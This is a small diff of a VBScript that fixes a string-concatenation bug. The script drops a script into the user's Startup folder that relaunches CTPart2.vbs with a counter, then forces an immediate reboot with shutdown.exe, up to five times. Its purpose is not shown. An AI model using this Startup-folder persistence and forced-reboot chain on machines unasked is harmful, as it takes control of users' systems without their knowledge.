@@ -48,7 +48,7 @@ fso.DeleteFile("C:\Users\" & cName & "\AppData\Roaming\Microsoft\Windows\Start M
 If Args(1) < 5 Then
 	Set b = fso.CreateTextFile("C:\Users\" & cName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\tempfile.vbs")
 	b.WriteLine("Set wShell = CreateObject(""WScript.Shell"")")
-	b.WriteLine("wShell.Run ""cscript " & Parent * "\CTPart2.vbs " & ZipFile & " " & Args(1) + 1 & " " & Timer() & """")
+	b.WriteLine("wShell.Run ""cscript " & Parent & "\CTPart2.vbs " & ZipFile & " " & Args(1) + 1 & " " & Timer() & """")
 	b.Close
 	wShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 0"
 End If
